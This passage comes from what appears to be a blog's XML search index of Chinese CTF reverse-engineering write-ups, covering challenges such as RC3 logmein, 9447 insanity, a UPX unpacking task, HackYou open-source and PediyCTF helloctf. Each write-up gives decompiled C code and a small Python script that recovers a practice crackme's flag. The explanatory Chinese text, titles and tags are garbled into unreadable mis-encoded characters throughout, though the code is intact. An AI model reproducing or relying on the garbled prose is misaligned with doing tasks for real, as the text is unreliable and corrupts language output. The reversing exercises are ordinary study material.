class="number">0x1464</span>,<span class="number">0x1478</span>,<span class="number">0x146E</span>,<span class="number">0x1470</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x146E</span>,<span class="number">0x147B</span>,<span class="number">0x1476</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x147B</span>,<span class="number">0x1480</span>]</span><br><span class="line">a = [<span class="number">0x1401</span>,<span class="number">0x1402</span>,<span class="number">0x1403</span>,<span class="number">0x1404</span>,<span class="number">0x1405</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    print(chr(s[i] - a[i % len(a)]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>ï¼ˆå¾…è¡¥å……ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
            <tag> å¾…è¡¥å…… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC3 CTF 2016 logmein</title>
      <link href="/2019/04/28/RC3-CTF-2016-logmein/"/>
      <url>/2019/04/28/RC3-CTF-2016-logmein/</url>
      
        <content type="html"><![CDATA[<p><a href="logmein">åˆæ˜¯ä¸€é“Linuxé€†å‘</a>ï¼Œè¿˜æ˜¯å…ˆæ”¾IDAäº†ã€‚</p><p>é‡å‘½åäº†ä¸¤ä¸ªå‡½æ•°ï¼Œæ–¹ä¾¿ç†è§£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">36</span>]; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560L</span>L;  <span class="comment">// 'ebmarah'</span></span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    wrong(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">  &#125;</span><br><span class="line">  correct();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥v8å°±æ˜¯åŠ å¯†åçš„flagï¼Œä¸‹æ–¹çš„å¾ªç¯åˆ©ç”¨v6ã€v7ï¼Œä¸ç”¨æˆ·è¾“å…¥ä¸€èµ·è®¡ç®—ï¼Œå†ä¸v8å¯¹æ¯”ï¼Œä¸»è¦è€ƒå¯Ÿçš„åº”è¯¥æ˜¯é€†å‘ç®—æ³•äº†ã€‚æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œv7æ˜¯æŒ‰å°ç«¯åºå­˜å‚¨çš„ï¼Œå› æ­¤åœ¨IDAä¸­è½¬æ¢ä¸ºå­—ç¬¦ï¼ˆå› ä¸ºv7æ˜¯æŒ‰å­—èŠ‚å–çš„ï¼‰ä¹‹åéœ€è¦é¢ å€’ä¸€ä¸‹é¡ºåºã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">b = <span class="string">'harambe'</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    m = ord(a[i]) ^ ord(b[i % <span class="number">7</span>])</span><br><span class="line">    key += chr(m)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 insanity</title>
      <link href="/2019/04/28/9447-CTF-2014-insanity/"/>
      <url>/2019/04/28/9447-CTF-2014-insanity/</url>
      
        <content type="html"><![CDATA[<p><a href="insanity">ä¸€é“å‡çš„é¢˜</a>ï¼Œè¿è¡Œéšæœºæš‚åœä¸€æ®µæ—¶é—´ï¼Œä¹‹åæ‰“å°flagâ€¦â€¦</p><p>è¿™é“é¢˜å¤ªç®€å•ï¼ŒæŒ‰ç†è¯´ä¸åº”è¯¥å•å‘çš„ï¼Œä½†æ˜¯æœ‰ç‚¹å°å¼ºè¿«ç—‡ï¼Œè¦æŠŠæ”»é˜²ä¸–ç•Œé€†å‘çš„æ¯é“é¢˜éƒ½å•å‘å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Reticulating splines, please wait.."</span>);</span><br><span class="line">  sleep(<span class="number">5u</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  <span class="built_in">puts</span>((&amp;strs)[v4 % <span class="number">0xA</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>åŒå‡»666</del>åŒå‡»&amp;strsç›´æ¥å‡ºã€‚<del>æˆ–è€…è¿è¡Œéšç¼˜å‡ºã€‚</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">9447&#123;This_is_a_flag&#125;</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">I&apos;ve got a good feeling about this one..... wait no. Maybe next time.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Have you considered becoming a vacuum cleaner? You&apos;re pretty good at sucking.</span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">Congrats, you hacked me!</span><br><span class="line">$ </span><br><span class="line"> ./insanity</span><br><span class="line">Reticulating splines, please wait..</span><br><span class="line">#define YOU &quot;massive failure&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>simple-unpack</title>
      <link href="/2019/04/28/simple-unpack/"/>
      <url>/2019/04/28/simple-unpack/</url>
      
        <content type="html"><![CDATA[<p>æç¤ºé‡Œé¢å·²ç»è¯´å¾—å¾ˆæ¸…æ¥šäº†ï¼Œ<a href="simple2">æ–‡ä»¶</a>ç»è¿‡äº†åŠ å£³ï¼Œæ‰€ä»¥ç”¨<code>detect it easy</code>æŸ¥å£³ï¼Œ</p><p><img src="/2019/04/28/simple-unpack/1.png" alt="æŸ¥å£³ç»“æœ" title="DIEæŸ¥å£³"></p><p>å‘ç°æ˜¯UPX3.91ï¼Œæ‹¿åˆ°è™šæ‹Ÿæœºé‡Œé¢è„±å£³ï¼Œè„±å£³åå…ˆè¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./simple2</span><br><span class="line">abcdefgh1234567890</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure></p><p>å†ç”¨IDAçœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _isoc99_scanf((<span class="keyword">unsigned</span> __int64)<span class="string">"%96s"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, flag) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations!"</span>, flag);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€¦â€¦è„±å£³åç›´æ¥å°±èƒ½çœ‹åˆ°flagäº†ï¼Œè¯´ç™½äº†è¿™é“é¢˜å°±æ˜¯ç»ƒä¹ è„±å£³çš„ï¼Œä¹Ÿè®¸è€ƒå¯Ÿæ‰‹åŠ¨è„±å£³2333ï¼Œä¸è¿‡ä¸çŸ¥é“Linuxä¸‹æœ‰ä»€ä¹ˆæ‰‹åŠ¨è„±å£³çš„æ–¹æ³•ï¼Œgdbçš„è¯ç”šè‡³ä¸çŸ¥é“æ€ä¹ˆä¸‹æ–­ç‚¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackYou CTF open-source</title>
      <link href="/2019/04/28/HackYou-CTF-open-source/"/>
      <url>/2019/04/28/HackYou-CTF-open-source/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="code.c">è¿™é“é¢˜</a>ç»™å‡ºäº†æºç ï¼Œä¸è¿‡å°±ç®—ä¸ç»™æˆ‘ä¹Ÿä¼šè‡ªè§‰F5çš„ğŸ™„ã€‚<br>ä¸ºäº†å‡‘æ–‡ç« å­—æ•°ï¼ŒæŠŠæºç ç²˜åˆ°äº†ä¸‹é¢2333ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¢ç„¶ç»™äº†ä»£ç å°±æ²¡ä»€ä¹ˆè¯´çš„ï¼Œç›´æ¥çœ‹å°±å¥½äº†ã€‚</p><p>å°çŸ¥è¯†ç‚¹ï¼š</p><ol><li><ul><li>argc â€“ å‘½ä»¤è¡Œå‚æ•° æ€»ä¸ªæ•°ï¼ŒåŒ…æ‹¬ å¯æ‰§è¡Œç¨‹åºåã€‚</li><li>argv[i] â€“ ç¬¬ i ä¸ªå‚æ•°ã€‚</li><li>argv[0] â€“ å¯æ‰§è¡Œç¨‹åºåã€‚</li></ul></li><li>atoiå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°ã€‚</li></ol><p>å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºè¦æ±‚è¾“å…¥3ä¸ªå‚æ•°ï¼Œå¹¶ä¸”å¯¹åº”ç¨‹åºä¸­çš„3ä¸ªå˜é‡ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°åº”å½“ç­‰äº<code>0xcafe</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ¨¡5<strong>ä¸ç­‰äº</strong>3ï¼Œæ¨¡17<strong>ç­‰äº</strong>8ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ç­‰äº<code>h4cky0u</code>ï¼Œæ¥ç€ç¨‹åºè®¡ç®—äº†ä¸€ä¸ªhashï¼Œæ˜¯åˆ©ç”¨äº†å‰ä¸‰ä¸ªå‚æ•°è®¡ç®—å¾—åˆ°çš„ã€‚æœ€åçš„keyæŒ‰åå…­è¿›åˆ¶è¾“å‡ºå°±æ˜¯hashã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">first=<span class="number">0xcafe</span></span><br><span class="line">second=<span class="number">25</span></span><br><span class="line">third=<span class="string">'h4cky0u'</span></span><br><span class="line">h=first*<span class="number">31337</span>+(second%<span class="number">17</span>)*<span class="number">11</span>+len(third)<span class="number">-1615810207</span></span><br><span class="line">print(<span class="string">'%x'</span> % h)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PediyCTF2018 helloctf</title>
      <link href="/2019/04/28/PediyCTF2018-helloctf/"/>
      <url>/2019/04/28/PediyCTF2018-helloctf/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="helloctf.exe">è¿™é“é¢˜</a>æç¤ºæ˜¯flagä¸æ˜¯æ˜æ–‡æ¯”è¾ƒçš„ï¼Œæ„å‘³ç€shift+f12ä¸èƒ½ç«‹åˆ»å‡ºflagäº†23333ã€‚<br>ç›®å‰çš„å‡ é“é¢˜æˆ‘éƒ½çœç•¥äº†æŸ¥å£³ï¼ˆå› ä¸ºæ–°æ‰‹å…¥é—¨é¢˜è¦ä¹ˆæ²¡å£³ï¼Œè¦ä¹ˆç›´æ¥å·¥å…·è„±ã€‚<br>é€†å‘çš„å¤§æ¦‚æµç¨‹åº”è¯¥æ˜¯å…ˆæŸ¥å£³è„±å£³å†é™æ€åˆ†ææœ€ååŠ¨æ€è°ƒè¯•å§ã€‚</p></blockquote><p>IDAæŸ¥çœ‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+12h] [ebp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">20</span>]; <span class="comment">// [esp+14h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+28h] [ebp-48h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+4Ah] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v13, <span class="string">"437261636b4d654a757374466f7246756e"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    print(aPleaseInputYou, v6);</span><br><span class="line">    <span class="built_in">scanf</span>(aS, v9);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) &gt; <span class="number">0x11</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v9[v3];</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v8, asc_408044, v4);</span><br><span class="line">      <span class="built_in">strcat</span>(&amp;v10, &amp;v8);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">17</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v10, &amp;v13) )</span><br><span class="line">      print(aSuccess, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print(aWrong, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  print(aWrong, v7);</span><br><span class="line">  result = stru_408090._cnt-- - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( stru_408090._cnt &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> _filbuf(&amp;stru_408090);</span><br><span class="line">  ++stru_408090._ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ¨æµ‹å‡ºï¼Œflagé•¿åº¦ä¸º17ï¼Œåœ¨while(1)å†…éƒ¨çš„do-whileä¸­ï¼Œç¨‹åºé€ä¸ªå–å‡ºè¾“å…¥å­—ç¬¦ä¸²çš„å­—ç¬¦ï¼Œæ ¼å¼åŒ–å¤„ç†åå­˜å…¥v10ï¼Œæœ€åæ¯”è¾ƒv10å’Œv13ï¼Œv13åœ¨ä¸Šé¢å·²ç»èµ‹å€¼ä¸º437261636b4d654a757374466f7246756eï¼Œæ ¼å¼åŒ–å¤„ç†çš„sprintfä¸­ï¼Œæ ¼å¼åŒ–å‚æ•°ä¸º%xï¼Œå³è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œæ‰€ä»¥flagæ˜¯æŒ‰åå…­è¿›åˆ¶å­˜å‚¨çš„ï¼Œåªè¦æŠŠv13è½¬åŒ–å›æ¥å°±å¯ä»¥äº†ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x43</span>,<span class="number">0x72</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x6b</span>,<span class="number">0x4d</span>,<span class="number">0x65</span>,<span class="number">0x4a</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x46</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å·¥ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZSCTF game</title>
      <link href="/2019/04/28/ZSCTF-game/"/>
      <url>/2019/04/28/ZSCTF-game/</url>
      
